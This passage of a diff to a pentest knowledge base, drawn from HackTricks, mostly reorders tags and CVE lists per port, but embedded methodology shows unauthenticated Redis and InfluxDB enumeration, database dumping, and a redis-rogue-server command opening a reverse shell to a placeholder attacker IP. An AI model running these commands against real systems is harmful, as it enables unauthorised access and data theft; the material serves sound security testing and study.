   "source": "hacktricks",
   "tags": [
-   "exploit/multi/upnp/libupnp_ssdp_overflow",
-   "auxiliary/scanner/ipmi/ipmi_cipher_zero",
    "ipmi",
+   "auxiliary/scanner/ipmi/ipmi_cipher_zero",
+   "auxiliary/scanner/ipmi/ipmi_dumphashes",
    "623",
    "auxiliary/scanner/ipmi/ipmi_version",
-   "auxiliary/scanner/ipmi/ipmi_dumphashes"
+   "exploit/multi/upnp/libupnp_ssdp_overflow"
   ]
  },
  "6379": {
@@ -5698,11 +5698,11 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-49844",
-   "CVE-2025-46818",
    "CVE-2025-46817",
+   "CVE-2025-46818",
    "cve-2025-49844",
-   "CVE-2022-0543"
+   "CVE-2022-0543",
+   "CVE-2025-49844"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\nFrom [the docs](https://redis.io/topics/introduction): Redis is an open source (BSD licensed), in-memory **data structure store**, used as a **database**, cache and message broker).\n\nBy default Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement **ssl/tls**. Learn how to [run Redis with ssl/tls here](https://fossies.org/linux/redis/TLS.md).\n\n**Default port:** 6379\n\n```\nPORT     STATE SERVICE  VERSION\n6379/tcp open  redis   Redis key-value store 4.0.9\n```\n\n## Automatic Enumeration\nSome automated tools that can help to obtain info from a redis instance:\n\n```bash\nnmap --script redis-info -sV -p 6379 <IP>\nmsf> use auxiliary/scanner/redis/redis_server\n```\n\n## Banner\nRedis is a **text based protocol**, you can just **send the command in a socket** and the returned values will be readable. Also remember that Redis can run using **ssl/tls** (but this is very weird).\n\nIn a regular Redis instance you can just connect using `nc` or you could also use `redis-cli`:\n\n```bash\nnc -vn 10.10.10.10 6379\nredis-cli -h 10.10.10.10 # sudo apt-get install redis-tools\n```\n\nThe **first command** you could try is **`info`**. It **may return output with information** of the Redis instance **or something** like the following is returned:\n\n```\n-NOAUTH Authentication required.\n```\n\nIn this last case, this means that **you need valid credentials** to access the Redis instance.\n\n## Redis Authentication\n**By default** Redis can be accessed **without credentials**. However, it can be **configured** to support **only password, or username + password**.\\\nIt is possible to **set a password** in _**redis.conf**_ file with the parameter `requirepass` **or temporary** until the service restarts connecting to it and running: `config set requirepass p@ss$12E45`.\\\nAlso, a **username** can be configured in the parameter `masteruser` inside the _**redis.conf**_ file.\n\n> [!TIP]\n> If only password is configured the username used is \"**default**\".\\\n> Also, note that there is **no way to find externally** if Redis was configured with only password or username+password.\n\nIn cases like this one you will **need to find valid credentials** to interact with Redis so you could try to [**brute-force**](../generic-hacking/brute-force.md#redis) it.\\\n**In case you found valid credentials you need to authenticate the session** after establishing the connection with the command:\n\n```bash\nAUTH <username> <passwor\n\n## **Authenticated enumeration**\nIf the Redis server permits **anonymous connections** or if you have obtained valid credentials, you can initiate the enumeration process for the service using the following **commands**:\n\n```bash\nINFO\n[ ... Redis response with info ... ]\nclient list\n[ ... Redis response with connected clients ... ]\nCONFIG GET *\n[ ... Get config ... ]\n```\n\n**Other Redis commands** [**can be found here**](https://redis.io/topics/data-types-intro) **and** [**here**](https://lzone.de/cheat-sheet/Redis)**.**\n\nNote that the **Redis commands of an instance can be renamed** or removed in the _redis.conf_ file. For example this line will remove the command FLUSHDB:\n\n```\nrename-command FLUSHDB \"\"\n```\n\nMore about configuring securely a Redis service here: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)\n\nYou can also **monitor in real time the Redis commands** execut\n\n## **Dumping Database**\nInside Redis the **databases are numbers starting from 0**. You can find if anyone is used in the output of the command `info` inside the \"Keyspace\" chunk:\n\n![](<../images/image (766).png>)\n\nOr you can just get all the **keyspaces** (databases) with:\n\n```\nINFO keyspace\n```\n\nIn that example the **database 0 and 1** are being used. **Database 0 contains 4 keys and database 1 contains 1**. By default Redis will use database 0. In order to dump for example database 1 you need to do:\n\n```bash\nSELECT 1\n[ ... Indicate the database ... ]\nKEYS *\n[ ... Get Keys ... ]\nGET <KEY>\n[ ... Get Key ... ]\n```\n\nIn case you get the following error `-WRONGTYPE Operation against a key holding the wrong kind of value` while running `GET <KEY>` it's because the key may be something else than a string or an integer and requires a special operator to display it.\n\nTo know the type of the key, use the `TYPE` command, example below for list and hash keys.\n\n```bash\nTYPE <KEY>\n[ ... Type of the Key ... ]\nLRANGE <KEY>\n\n## If the type used is weird you can always do:\nDUMP <key>\n```\n\n**Dump the database with npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **or python** [**redis-utils**](https://pypi.org/project/redis-utils/)\n\n## Interactive Shell\n[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5).\n\n```\n./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>\n```\n\n##",
@@ -5710,9 +5710,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "6379",
    "auxiliary/scanner/redis/redis_server",
-   "redis"
+   "redis",
+   "6379"
   ]
  },
  "69": {
@@ -5775,9 +5775,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "69",
    "tftp",
-   "auxiliary/admin/tftp/tftp_transfer_util",
-   "69"
+   "auxiliary/admin/tftp/tftp_transfer_util"
   ]
  },
  "7": {
@@ -5830,8 +5830,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "7 tcp udp pentesting echo",
-   "7"
+   "7",
+   "7 tcp udp pentesting echo"
   ]
  },
  "700": {
@@ -5856,8 +5856,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "700",
-   "700 pentesting epp"
+   "700 pentesting epp",
+   "700"
   ]
  },
  "8009": {
@@ -6182,9 +6182,9 @@
    }
   ],
   "common_vulnerabilities": [
+   "CVE-2019-20933",
    "cve-2024-30896",
-   "CVE-2024-30896",
-   "CVE-2019-20933"
+   "CVE-2024-30896"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**InfluxDB** is an open-source **time series database (TSDB)** developed by InfluxData. TSDBs are optimized for storing and serving time series data, which consists of timestamp-value pairs. Compared to general-purpose databases, TSDBs provide significant improvements in **storage space** and **performance** for time series datasets. They employ specialized compression algorithms and can be configured to automatically remove old data. Specialized database indices also enhance query performance.\n\n**Default port**: 8086\n\n```\nPORT     STATE SERVICE VERSION\n8086/tcp open  http    InfluxDB http admin 1.7.5\n```\n\n## Identify & Version (HTTP)\n- v1.x: `GET /ping` returns status 204 and headers like `X-Influxdb-Version` and `X-Influxdb-Build`.\n- v2.x+: `GET /health` returns JSON with the server version and status. Works without auth.\n\n```bash\n\n## v2/compat health\ncurl -s http://<host>:8086/health | jq .\n```\n\nTip: exposed instances often also serve Prometheus-style metrics at `/metrics`.\n\n## Enumeration\nFrom a pentester point of view this another database that could be storing sensitive information, so it's interesting to know how to dump all the info.\n\n## Authentication\nInfluxDB might require authentication or not\n\n```bash\n\n## Try unauthenticated CLI (v1 shell)\ninflux -host <host> -port 8086\n> use _internal\n```\n\nIf you **get an error like** this one: `ERR: unable to parse authentication credentials` it means that it's **expecting some credentials**.\n\n```\ninflux –username influx –password influx_pass\n```\n\nThere was a vulnerability influxdb that allowed to bypass the authentication: [**CVE-2019-20933**](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)\n\n## Manual Enumeration (v1 HTTP API / InfluxQL)\nEven when no CLI is available, the HTTP API is usually exposed on port 8086.\n\n```bash\n\n## List databases (unauth)\ncurl -sG \"http://<host>:8086/query\" --data-urlencode \"q=SHOW DATABASES\"\n\n## List retention policies of a DB\ncurl -sG \"http://<host>:8086/query\" --data-urlencode \"db=telegraf\" --data-urlencode \"q=SHOW RETENTION POLICIES ON telegraf\"\n\n## List users (if auth disabled)\ncurl -sG \"http://<host>:8086/query\" --data-urlencode \"q=SHOW USERS\"",
@@ -6193,8 +6193,8 @@
   "source": "hacktricks",
   "tags": [
    "auxiliary/scanner/http/influxdb_enum",
-   "8086 pentesting influxdb",
-   "8086"
+   "8086",
+   "8086 pentesting influxdb"
   ]
  },
  "8089": {
@@ -6319,8 +6319,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "8089 splunkd",
-   "8089"
+   "8089",
+   "8089 splunkd"
   ]
  },
  "8333": {
@@ -6460,8 +6460,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "8333 18333 38333 18444 pentesting bitcoin",
-   "8333"
+   "8333",
+   "8333 18333 38333 18444 pentesting bitcoin"
   ]
  },
  "873": {
@@ -6618,8 +6618,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "rsync",
    "873",
+   "rsync",
    "auxiliary/scanner/rsync/modules_list"
   ]
  },
@@ -6847,8 +6847,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "9001",
-   "9001 pentesting hsqldb"
+   "9001 pentesting hsqldb",
+   "9001"
   ]
  },
  "9100": {
@@ -7050,13 +7050,13 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/printer/printer_version_info",
-   "auxiliary/scanner/printer/printer_ready_message",
-   "auxiliary/scanner/printer/printer_delete_file",
-   "9100 pjl",
-   "auxiliary/scanner/printer/printer_list_dir",
    "auxiliary/scanner/printer/printer_download_file",
-   "9100"
+   "auxiliary/scanner/printer/printer_env_vars",
+   "auxiliary/scanner/printer/printer_ready_message",
+   "auxiliary/scanner/printer/printer_list_dir",
+   "auxiliary/scanner/printer/printer_upload_file",
+   "9100",
+   "9100 pjl"
   ]
  },
  "9200": {
@@ -7175,9 +7175,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "9200",
+   "elasticsearch",
    "auxiliary/scanner/elasticsearch/indices_enum",
-   "elasticsearch"
+   "9200"
   ]
  },
  "403": {
